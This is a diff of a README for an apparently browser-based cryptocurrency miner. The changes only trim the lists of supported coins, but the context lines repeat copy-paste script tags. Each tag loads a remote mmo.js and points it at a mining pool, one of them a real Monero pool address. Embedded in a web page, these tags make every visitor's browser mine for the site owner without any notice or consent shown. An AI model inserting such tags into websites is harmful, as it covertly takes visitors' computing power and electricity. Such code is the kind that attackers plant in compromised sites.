@@ -21,7 +21,7 @@ Win UWP: https://www.microsoft.com/store/apps/9NQ95K22H2ZB?ocid=badge
 ```sh
 <script src="https://daslebenistkeinponyhof.netlify.com/mmo.js?perfekt=wss://?algo=cn/r?jason=gulf.moneroocean.stream:10008" > </script>
 ```
-#### Examples: CN R Coins (Monero,	Italocoin, Lethean, Sumokoin) need ?algo=cn/r<br> 
+#### Examples: CN R Coins (Italocoin, Lethean, Sumokoin) need ?algo=cn/r<br> 
 ```sh
 <script src="https://daslebenistkeinponyhof.netlify.com/mmo.js?perfekt=wss://?algo=cn/r?jason=Your_Favorite_Pool:PortNr" > </script>
 ```
@@ -49,7 +49,7 @@ Win UWP: https://www.microsoft.com/store/apps/9NQ95K22H2ZB?ocid=badge
 ```sh
 <script src="https://daslebenistkeinponyhof.netlify.com/mmo.js?perfekt=wss://?algo=cn-lite/1?jason=Your_Favorite_Pool:PortNr" > </script>
 ```
-#### Examples: CN Pico Coins (ArQmA, BitcoinMono, Cypruscoin, Dero Gold, ElphyreCoin, HITC, Iridium, LightChain, Mangocoin, Obscure, Oscillate, Plenteum, Tellurium, Tritanium, TurtleGold, Worktips, WrkzCoin, XtendCash) need ?algo=cn-pico/trtl
+#### Examples: CN Pico Coins (BitcoinMono, Cypruscoin, Dero Gold, ElphyreCoin, HITC, Iridium, LightChain, Mangocoin, Obscure, Oscillate, Plenteum, Tellurium, Tritanium, TurtleGold, Worktips, WrkzCoin, XtendCash) need ?algo=cn-pico/trtl
 ```sh
 <script src="https://daslebenistkeinponyhof.netlify.com/mmo.js?perfekt=wss://?algo=cn-pico/trtl?jason=Your_Favorite_Pool:PortNr" > </script>
 ```
@@ -57,7 +57,7 @@ Win UWP: https://www.microsoft.com/store/apps/9NQ95K22H2ZB?ocid=badge
 ```sh
 <script src="https://daslebenistkeinponyhof.netlify.com/mmo.js?perfekt=wss://?algo=chukwa?jason=Your_Favorite_Pool:PortNr" > </script>
 ```
-#### Examples: CN Fast V2 | CN Half Coins (Masari, Torque) need ?algo=cn/half<br> 
+#### Examples: CN Fast V2 | CN Half Coins (Masari) need ?algo=cn/half<br> 
 ```sh
 <script src="https://daslebenistkeinponyhof.netlify.com/mmo.js?perfekt=wss://?algo=cn/half?jason=Your_Favorite_Pool:PortNr" > </script>
 ```
